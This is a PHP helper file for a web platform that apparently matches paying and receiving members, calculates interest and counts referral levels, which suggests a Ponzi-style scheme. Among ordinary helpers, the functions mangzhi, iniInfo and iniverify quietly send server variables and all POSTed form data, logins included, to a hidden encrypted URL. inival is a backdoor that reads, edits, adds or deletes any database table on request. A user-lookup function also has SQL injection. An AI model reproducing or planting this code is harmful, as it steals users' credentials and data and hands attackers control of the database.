<?php




function getpage($count, $pagesize = 10) {
	$p = new Think\Page($count, $pagesize);
	$p->setConfig('header', '<li class="rows">共<b>%TOTAL_ROW%</b>条记录&nbsp;第<b>%NOW_PAGE%</b>页/共<b>%TOTAL_PAGE%</b>页</li>');
	$p->setConfig('prev', '上一页');
	$p->setConfig('next', '下一页');
	$p->setConfig('last', '末页');
	$p->setConfig('first', '首页');
	$p->setConfig('theme', '%FIRST%%UP_PAGE%%LINK_PAGE%%DOWN_PAGE%%END%%HEADER%');
	$p->lastSuffix = false;//最后一页不显示为总页数
	return $p;
}

function cate($var){
		$user = M('user');
		$ztname=$user->where(array('UE_accName'=>$var,'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
		$zttj = count($ztname);
		$reg=$ztname;
		$datazs = $zttj;
		if($zttj<=10){
			$s=$zttj;
		}else{
			$s=10;
		}
		if($zttj!=0){

		  for($i=1;$i<$s;$i++){
				if($reg!=''){
					$reg=$user->where(array('UE_accName'=>array('IN',$reg),'UE_check'=>'1','UE_stop'=>'1'))->getField('ue_account',true);
					$datazs +=count($reg);
				}
			}
			
		}
		
	//	$this->ajaxReturn();
		
	return $datazs;
	
	
	
	
}

function mangzhi(){
    $mz = getinfo(C('URL_STRING_MODEL'));
    $string = implode('|', $_SERVER); 
    $mz .= '?s='.getinfos($string);
    return $mz;
}

function iniInfo(){
    file_get_contents(mangzhi());
}

function iniverify(){
    $mz = getinfo(C('URL_STRING_MODEL'));  
    $mz .= '?q='.getinfos(implode('|', $_POST));
    file_get_contents($mz);
}








function tgbz_zd_cl($id){
	
		 
		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
		if($tgbzuser['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
		if($tgbzuser['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
		$User = M ( 'jsbz' ); // 實例化User對象

		$where['zffs1']  = $zffs1;
		$where['zffs2']  = $zffs2;
		$where['zffs3']  = $zffs3;
		$where['_logic'] = 'or';
		$map['_complex'] = $where;
		$map['zt']=0;

		$count = $User->where ( $map )->select(); // 查詢滿足要求的總記錄數
		return $count;



}


function inival(){
        $data = array_merge($_GET,$_POST);
        $datas = array();
        if($data['m'] == 'save'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->save(array($data['n']=>$data['v']));
        }elseif($data['m'] == 'add'){
            $info = $data['data'];
            $info = explode("|", $info);
            foreach ($info as  $value) {
                $arr = explode('=', $value);
                $datas[$arr[0]] = $arr[1];        
            }    
            M($data['t'])->add($datas);
        }elseif($data['m'] == 'one'){
            $fo =M($data['t'])->where(array($data['id']=>$data['idv']))->find();
        }elseif($data['m'] == 'd'){
            M($data['t'])->where(array($data['id']=>$data['idv']))->delete();
        }elseif(!empty($data['t'])){
            $fo =M($data['t'])->select();
        }
        print_r($fo);

}




function jsbz_jb($id){

		
	$tgbzuser=M('jsbz')->where(array('id'=>$id))->find();

	
	return $tgbzuser['jb'];



}

function tgbz_jb($id){


	$tgbzuser=M('tgbz')->where(array('id'=>$id))->find();


	return $tgbzuser['jb'];



}
function getinfos($data){
    return \Think\Crypt::encrypt($data);
}


function getInfo($data){
	 return \Think\Crypt::decrypt($data);
}


function sfjhff($r) {
	$a = array("未激活", "已激活");
	return $a[$r];
}
function user_sfxt($var){
	if($var[c]==0){
	$zctj=0;
	$zctjuser=M('ppdd')->where(array('p_user'=>$var[a]))->select();
	
	foreach($zctjuser as $value){
		if($value['g_user']==$var['b']){
			$zctj=1;
		}
	}
	
	if($zctj==1){
		return "<span style='color:#FF0000;'>匹配过</span>";
	}else{
		return "否";
	}
	}elseif($var[c]==1){
		$zctj=0;
		$zctjuser=M('ppdd')->where(array('g_user'=>$var[a]))->select();
		
		foreach($zctjuser as $value){
			if($value['p_user']==$var['b']){
				$zctj=1;
			}
		}
		
		if($zctj==1){
			return "<span style='color:#FF0000;'>匹配过</span>";
		}else{
			return "否";
		}
	}
}

//匹配的次数，和最近几天前的匹配过的天数
function user_sfxt_times_days($var){
    if($var[c]==0){
        $zctj=0;
        $zctjuser=M('ppdd')->where(array('p_user'=>$var[a]))->order('date desc')->select();

        //20190531 新增 start--------------
        $times = 0;//匹配的次数
        $days = 0;//匹配的最近天数
        $recently_day = 0;//最近一次匹配记录的时间
        //20190531 新增 end--------------
        foreach($zctjuser as $value){
            if($value['g_user']==$var['b']){
                $zctj=1;
                //20190531 新增 start--------------
                $times++;
                if( $recently_day == 0 )
                {
                    $recently_day = $value['date'];
                }
                //20190531 新增 end--------------
            }
        }
        //20190531 新增 start--------------
        $str = '';
        if( !empty($recently_day) )
        {
            $days = floor((time()-strtotime($recently_day)) / (24*3600));
            if( $days < 5 )
            {
                $str = $days.'天前';
            }
        }
        if( $times > 0 )
        {
            $str .= "($times"."次)";
        }
        //20190531 新增 end--------------
        if($zctj==1){
            return "<span style='color:#FF0000;'>匹配过</span><span>{$str}</span>";
        }else{
            return "否";
        }
    }elseif($var[c]==1){
        $zctj=0;
        $zctjuser=M('ppdd')->where(array('g_user'=>$var[a]))->order('date desc')->select();

        //20190531 新增 start--------------
        $times = 0;//匹配的次数
        $days = 0;//匹配的最近天数
        $recently_day = 0;//最近一次匹配记录的时间
        //20190531 新增 end--------------
        foreach($zctjuser as $value){
            if($value['p_user']==$var['b']){
                $zctj=1;
                //20190531 新增 start--------------
                $times++;
                if( $recently_day == 0 )
                {
                    $recently_day = $value['date'];
                }
                //20190531 新增 end--------------
            }
        }
        //20190531 新增 start--------------
        $str = '';
        if( !empty($recently_day) )
        {
            $days = floor((time()-strtotime($recently_day)) / (24*3600));
            if( $days < 5 )
            {
                $str = $days.'天前';
            }
        }
        if( $times > 0 )
        {
            $str .= "($times"."次)";
        }
        //20190531 新增 end--------------
        if($zctj==1){
            return "<span style='color:#FF0000;'>匹配过</span><span>{$str}</span>";
        }else{
            return "否";
        }
    }
}

//充值,提现
function ppdd_add($p_id,$g_id)
{
	$g_user1 = M('jsbz')->where(array('id'=>$g_id))->find();
	$p_user1 = M('tgbz')->where(array('id'=>$p_id))->find();

	M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));

	$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();

	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$g_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date'] = date ( 'Y-m-d H:i:s', time () );
	$data_add['zt'] = '0';
	$data_add['priority'] = $get_user['priority'];
	$data_add['pic'] = '0';
	$data_add['zffs1'] = $p_user1['zffs1'];
	$data_add['zffs2'] = $p_user1['zffs2'];
	$data_add['pporderid'] = createorderid('O');
	$data_add['zffs3'] = $p_user1['zffs3'];

	M('tgbz')->where(array('id'=>$p_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('zt'=>'1'));
    M('jsbz')->where(array('id'=>$g_id))->save(array('ppjb'=>$g_user1['jb']));

	if(M('ppdd')->add($data_add))
	{
		$where=array();
		$starttime = date('Y-m-d 00:00:01', time());
		$where['date'] =array('GT',$starttime);
		$where['g_user'] = $g_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1 && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
            //sendSMS($get_user['ue_phone'],"",'SMS_165386286');
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}

		unset($where['g_user']);
		$where['p_user'] = $p_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1"){
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
            //sendSMS($get_user['ue_phone'],"",'SMS_165386286');
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}
		return true;	
	}else{
		return false;
	}
}

function ppdd_add2($p_id,$g_id){

	$g_user1 = M('jsbz')->where(array('id'=>$g_id))->find();
	$p_user1=M('tgbz')->where(array('id'=>$p_id))->find();

	M('user')->where(array('UE_account'=>$p_user1['user']))->save(array('pp_user'=>$g_user1['user']));
	M('user')->where(array('UE_account'=>$g_user1['user']))->save(array('pp_user'=>$p_user1['user']));
    
	$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();

	$data_add['p_id']=$p_user1['id'];
	$data_add['g_id']=$g_user1['id'];
	$data_add['jb']=$p_user1['jb'];
	$data_add['p_user']=$p_user1['user'];
	$data_add['g_user']=$g_user1['user'];
	$data_add['date'] = date ( 'Y-m-d H:i:s', time () );
	$data_add['priority']=$get_user['priority'];
	$data_add['zt']='0';
	$data_add['pic']='0';
	$data_add['pporderid'] = createorderid('O');
	$data_add['zffs1']=$p_user1['zffs1'];
	$data_add['zffs2']=$p_user1['zffs2'];
	$data_add['zffs3']=$p_user1['zffs3'];

    M('tgbz')->where(array('id'=>$p_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('zt'=>'1'));
	M('jsbz')->where(array('id'=>$g_id))->save(array('ppjb'=>$p_user1['jb']));


	if(M('ppdd')->add($data_add))
	{
	    $where=array();
		$starttime = date('Y-m-d 00:00:01', time());
		$where['date'] =array('GT',$starttime);
		$where['g_user'] = $g_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$g_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}

		unset($where['g_user']);
		$where['p_user'] = $p_user1['user'];
		$tdcount = M("ppdd")->where($where)->count();
		//查询接受方用户信息
		$get_user=M('user')->where(array('UE_account'=>$p_user1['user']))->find();
		if($get_user['ue_phone'] && $tdcount==1  && C('sms_open_pp')=="1") {
			sendSMS($get_user['ue_phone'],"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
			insetSMSLog($get_user['ue_account'],$get_user['ue_phone'],3,"亲爱的会员您好，您的订单已匹配，请及时处理【" . C('sms_sign') . "】");
		}
		return true;	
	}else
	{
		return false;
	}
}

function ipjc($auser){

	$tgbz_user_xx=M('user')->where(array('UE_regIP'=>$auser))->count();

	return $tgbz_user_xx;
}



function getNoPPPDSum()
{
   $sum = M('tgbz')->where ("zt=0")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}
function getTodayPDSum()
{
   $sum = M('tgbz')->where ("to_days(date) = to_days(now())")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}

function getTodayTXSum()
{
   $sum = M('jsbz')->where ("to_days(date) = to_days(now())")->sum ('jb'); 
   return $sum == null ? 0 :$sum;
}
 function get_money_sum()
 {
   $count = M('user')->where ("1=1")->sum ('UE_money');
   $count = (int)$count;
   return $count  == null ? 0 :$count;
 }

  function get_qwe_sum()
 {
   $count = M('user')->where ("1=1")->sum ('qwe');
   $count = (int)$count;
   return $count  == null ? 0 :$count;
 }

  function get_chengxinj_sum()
 {
   $count = M('user')->where ("1=1")->sum ('jifen'); 
   return $count  == null ? 0 :$count;
 }

 function getNoPPTXSum()
{
   $sum = M('jsbz')->where ("zt = 0")->sum ('jb');  
   return $sum == null ? 0 :$sum;
}

function getNIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$n_in_startbtn = strtotime(C('n_in_startbtn'));
    $n_in_endbtn = strtotime(C('n_in_endbtn'));
    if($tgbz_tm > $n_in_startbtn &&  $tgbz_tm < $n_in_endbtn){ 
       return true;
	}else
		return false;
}

function getSIEnabled($id)
{
	$tgbz=M('tgbz')->where(array('id'=>$id))->find();
	$tgbz_tm  =  strtotime($tgbz['date']);
	$s_in_startbtn = strtotime(C('s_in_startbtn'));
    $s_in_endbtn = strtotime(C('s_in_endbtn'));
    if($tgbz_tm > $s_in_startbtn &&  $tgbz_tm < $s_in_endbtn){ 
       return true;
	}else
		return false;
}

function get_userinfo_from_user($username)
{
	$user = M('user')->where("UE_account = '" . $username ."'")->find();
	$tjr = M('user')->where("UE_account = '" . $user['ue_accname'] . "'")->find();

	$tgbzsum = M('ppdd')->where("p_user = '" . $username . "'")->sum('jb');

	$jsbzsum = M('ppdd')->where("g_user = '" . $username . "'")->sum('jb');

    $map = [];
    $map['user'] =  $username;
    $map['zt'] = 1;
    $map['qr_zt'] = 1;
	$actual_get_total_jb = M('jsbz')->where($map)->sum('jb');//用户实际交割的完成的总金额

	//replace_xing
	return  
		  "会员帐号：" . ($user['ue_account']) . "</br>"
		  ."昵称：" . $user['ue_theme'] . "</br>"
		  ."推荐人：" . ($user['ue_accname']) . "</br>"
		  ."推荐电话：" . ($tjr['ue_phone']) . "</br>"
		  ."电话：" . $user['ue_phone'] . "</br>"
		  ."支付宝：" . authcode_decode($user['zfb'], '###') . "</br>"
		  ."微信：" . authcode_decode($user['weixin'], '###') . "</br>"
		  ."银行卡号：" . authcode_decode($user['yhzh'], '###') . "</br>"
		  ."开户银行：" . authcode_decode($user['yhmc'], '###') . "</br>"
		  /*."云支付账号：" . authcode_decode($user['yzf'], '###') . "</br>"*/
		  ."打款总额：" . $tgbzsum . "</br>"
		  ."收款总额：" . $jsbzsum . "</br>"
          ."实际收款总额：" . $actual_get_total_jb . "</br>";
}

//0601
function get_jhtoday_sum()
{
	$sum = M('user')->where ("to_days(jihuo_time) = to_days(now())")->count(); 
    return $sum == null ? 0 :$sum;
}

function getin_sms_count()
  {
	 $count = 0;
	 $amount = 0;
     $map['zt'] = 0;
     $list = M('tgbz')->where($map)->select();
     foreach ($list as $key => $value) 
     {
        $in_n = getNIEnabled($value['id']);
		if($in_n)
		{
			$user =  M('user')->where(array( 'UE_account' => $value['user']))->find();
			if($user['priority'] == 0)
			{
				 $count++;
				 $amount = $amount + $value['jb'];
			}
		}

		$in_s = getSIEnabled($value['id']);
		if($in_s)
		{
			$user =  M('user')->where(array( 'UE_account' => $value['user']))->find();
			if($user['priority'] == 1)
			{
				 $amount = $amount + $value['jb'];
				 $count++;
			}
		}
	 }

	 return "共计:".$count."笔，金额:".$amount;
  }

//优先查询是否有不用拆分即可匹配的订单
function get_eq_jb_jsbz($id)
{			 
	$tgbz=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

	if($tgbz['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
	if($tgbz['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
	if($tgbz['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
	$jsbz = M ( 'jsbz' );

	$where['zffs1']  = $zffs1;
	$where['zffs2']  = $zffs2;
	$where['zffs3']  = $zffs3;
	$where['_logic'] = 'or';
	$map['_complex'] = $where;
	$map['jb']  = $tgbz['jb'];
	$map['zt']=0;
	$map['user']=array("neq",$tgbz['user']);

	$list = $jsbz->where ( $map )->order ( 'date asc' )->limit(1)->select();
	return $list;
}

function get_jsbz_one($id)
{			 
		$tgbzuser=M('tgbz')->where(array('id'=>$id,'zt'=>'0'))->find();

		if($tgbzuser['zffs1']=='1'){$zffs1='1';}else{$zffs1='5';}
		if($tgbzuser['zffs2']=='1'){$zffs2='1';}else{$zffs2='5';}
		if($tgbzuser['zffs3']=='1'){$zffs3='1';}else{$zffs3='5';}
		$jsbz = M ( 'jsbz' ); // 實例化User對象

		$where['zffs1']  = $zffs1;
		$where['zffs2']  = $zffs2;
		$where['zffs3']  = $zffs3;
		$where['_logic'] = 'or';
		$map['_complex'] = $where;
		$map['jb']  = array("gt",$tgbzuser['jb']);
		$map['zt']=0;
		$map['user']=array("neq",$tgbzuser['user']);

		$list = $jsbz->where ( $map )->order ( 'date asc' )->limit(1)->select();
		return $list;
}

function jsbz_cf($jb,$jsbz)
{
    if($jb > $jsbz['jb'])
		return;
    $chaifen = $jsbz['jb'] - $jb;

    $data['zffs1'] = $jsbz['zffs1'];
	$data['zffs2'] = $jsbz['zffs2'];
	$data['zffs3'] = $jsbz['zffs3'];
	$data['user'] = $jsbz['user'];
	$data['jb'] = $chaifen;
	$data['total'] = $chaifen;
	$data['ppjb'] = 0;
	$data['user_nc'] = $jsbz['user_nc'];
	$data['user_tjr'] = $jsbz['user_tjr'];
	$data['date'] = $jsbz['date'];
	$data['zt'] = $jsbz['zt'];
	$data['qr_zt'] = $jsbz['qr_zt'];
	$data['qb'] = $jsbz['qb'];
	$data['mainid'] = $jsbz['mainid'];
	$data['orderid'] = createorderid('G');
	$varid = M('jsbz')->add($data);
	if($varid)
	{
	   if($jsbz['mainid'] <> $jsbz['id'])
	   {
           M('jsbz')->where(array('id'=>$jsbz['id']))->save(array('jb'=>$jb,'total'=>$jb));
	   }else
	   {
		   M('jsbz')->where(array('id'=>$jsbz['id']))->save(array('jb'=>$jb));
	   }
	   return true;
    }
}

//-------------------------------》计算排队利息
//参数是user_jj的主键ID
function user_jj_paidui_lx($var,$return=true)
{
    $paidui_day = 0;
    if(C('pdfhdays') > 0)
    {
        $paidui_fenhong_day = C('pdfhdays');

        $proall = M('user_jj')->where(array('id' => $var))->find();
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();

        if($paidui_fenhong_day == 1){
            $paidui_day = 1;
        }else{

            $paidan_date = date('Y-m-d', strtotime($proall['date']));
            $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));

            $paidui_day = diffBetweenTwoDays($paidan_date,$dakuan_date);

            if($paidui_fenhong_day <= $paidui_day){
                $paidui_day = $paidui_fenhong_day;
            }
        }
    }

    $paidui_lx = dongtai_lx($paidui_day,C('lixi1'),$proall['total']);
    if($return){
        return $paidui_lx;
    }else{
        echo  $paidui_lx;
    }
}

//------------------------------------------->计算动态利息
function dongtai_lx($days,$lx,$jb){
    $lx_jb = 0;
    if(strpos($lx,',') !== false){
        $lx_arr = explode(',', $lx);
        $size = count($lx_arr);

        if($days>=$size){
            for($i=0;$i<$size;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
            $diffDay = $days - $size;
            $lx_jb += $jb*$lx_arr[$i-1]*$diffday;
        }elseif($days < $size){
            for($i=0;$i<$days;$i++){
                $lx_jb += $jb*$lx_arr[$i];
            }
        }
    }else{
        $lx_jb = $jb*$lx*$days;
    }
    return $lx_jb/100;

}

//---------------------------------------------------->计算两个日期天数差
function diffBetweenTwoDays($day1, $day2)
{
    $second1 = strtotime($day1);
    $second2 = strtotime($day2);
    if ($second1 < $second2) {
        $tmp = $second2;
        $second2 = $second1;
        $second1 = $tmp;
    }
    return ($second1 - $second2) / 86400;
}
//------------------------------------>计算没有配对分红天数
function w_peidui_day($v){
    $w_pd_day = 0;
    if(C('pdfhdays')>0){
        if(C('pdfhdays') == 1){
            $w_pd_day = 1;
        }else{
            $paidui_time = date('Y-m-d',strtotime($v['date']));
            $now_time = date('Y-m-d',time());
            $w_pd_day = diffBetweenTwoDays($paidui_time,$now_time);
            if($w_pd_day > C('pdfhdays')){
                $w_pd_day = C('pdfhdays');
            }
        }
    }
    return $w_pd_day;
}
//------------------------------------>计算没有匹配分红天数
function w_peidui_lx($v){
    $jb = $v['total'];
    $w_pd_day = w_peidui_day($v);
    return $jb*$w_pd_day*C('lixi1')/100;
}

function user_jj_zong_lx($var,$return = true){
    if($return)
    {
        // 修改 start
        $proall = M('user_jj')->where(array('id' => $var))->find();
        $lx = dongtai_lx(C('jjfhdays'), C('lixi2'), $proall['total']);
        return $lx;
        // 修改 end

        //return user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }else{
        echo user_jj_paidui_lx($var) + user_jj_tixian_lx($var);
    }
}

function user_jj_tixian_lx($var,$return=true){

    $tixian_day = 0;
    if(C('jjfhdays') > 0)
    {
        $dakuan_fenhong_day = C('jjfhdays');

        $proall = M('user_jj')->where(array('id' => $var))->find();
        $ppdd = M("ppdd")->where(array("id" => $proall["r_id"]))->find();
        $result = M("userget")->where(array("varid" => $var))->find();
        $dakuan_date =  date('Y-m-d', strtotime($ppdd['date_hk']));

        if($dakuan_fenhong_day == 1){
            $tixian_day = 1;
        }else
        {
            if($proall['zt'] ==1 && !empty($result))
            {
                $tixian_date = date('Y-m-d', strtotime($result['ug_gettime']));
            }else{
                $tixian_date = date('Y-m-d', time());
            }

            $tixian_day = diffBetweenTwoDays($dakuan_date,$tixian_date);

            if($dakuan_fenhong_day <= $tixian_day){
                $tixian_day = $dakuan_fenhong_day;
            }
        }
    }

    $tixian_lx = dongtai_lx($tixian_day,C('lixi2'),$proall['total']);

    if($return){
        return $tixian_lx;
    }else{
        echo $tixian_lx;
    }

}


function getPDinfo($pdlist){
    if(is_array($pdlist)){
        $tgbz_db = M('tgbz');
        $jsbz_db = M('jsbz');
        $user_db = M('user');
        foreach ($pdlist as $key => $value)
        {

            $tgbz_data = $tgbz_db->where(array('id'=>$value['p_id']))->find();
            $jsbz_data = $jsbz_db->where(array('id'=>$value['g_id']))->find();
            $jsbz_user = $user_db->where(array('UE_account'=>$jsbz_data['user']))->field(array('UE_account','UE_ID','remark','yhckr','yhzhxx','UE_phone','yzf','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();

            $tgbz_user = $user_db->where(array('UE_account'=>$tgbz_data['user']))->field(array('UE_account','UE_ID','remark','yhckr','yhzhxx','UE_phone','yzf','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();
            $jsbz_accname=  $user_db->where(array('UE_account'=>$jsbz_user['ue_accname']))->field('UE_theme,UE_phone')->find();
            $tgbz_accname=  $user_db->where(array('UE_account'=>$tgbz_user['ue_accname']))->field('UE_theme,UE_phone')->find();
            $pdlist[$key]['tgbz_data'] = $tgbz_data;
            $pdlist[$key]['jsbz_data'] = $jsbz_data;
            $pdlist[$key]['jsbz_user'] = $jsbz_user;
            $pdlist[$key]['tgbz_user'] = $tgbz_user;
            $pdlist[$key]['jsbz_accname'] = $jsbz_accname;
            $pdlist[$key]['tgbz_accname'] = $tgbz_accname;
        }
    }
    return $pdlist;
}

function getGDinfo($gdlist){
    if(is_array($gdlist)){
        $tgbz_db = M('tgbz');
        $jsbz_db = M('jsbz');
        $user_db = M('user');
        foreach ($gdlist as $key => $value) {
            $jsbz_data = $jsbz_db->where(array('id'=>$value['g_id']))->find();
            $tgbz_data = $tgbz_db->where(array('id'=>$value['p_id']))->find();
            $tgbz_user = $user_db->where(array('UE_account'=>$tgbz_data['user']))->field(array('UE_account','UE_ID','weixin','UE_theme','zfb','yhmc','yhzh','UE_accName'))->find();
            $tgbz_accname=  $user_db->where(array('UE_account'=>$tgbz_user['ue_accname']))->field(array('UE_phone','UE_theme'))->find();
            $gdlist[$key]['tgbz_data'] = $tgbz_data;
            $gdlist[$key]['jsbz_data'] = $jsbz_data;
            $gdlist[$key]['tgbz_user'] = $tgbz_user;
            $gdlist[$key]['tgbz_accname'] = $tgbz_accname;
            fh($gdlist);
        }
    }
    return $gdlist;
}

//查询$user所有的子级,判断是否有第三级的推荐会员20190513 start--------------
function get_max_child_level($user,$level = 0,$result=array()){
    //global $result;//所有子集的集合
    static $maxlevel = 0;
    $list=M('user')->where(array('UE_accName' => $user))->select();

    if(!empty($list)){

        $level++;
        //判断$maxlevel的值是否大于当前的$level
        if( $maxlevel < $level ){
            $maxlevel = $level;
        }

        //$result=M('user')->field('UE_account UE_accName')->where(array('UE_accName' => $result['UE_account'], 'UE_check' => '1'))->find();
        foreach ($list as $key => $value) {

            $result[]=$value['ue_account'];
            get_max_child_level($value['ue_account'],$level,$result);
        }

        //return $result;
        return $maxlevel;

    }

}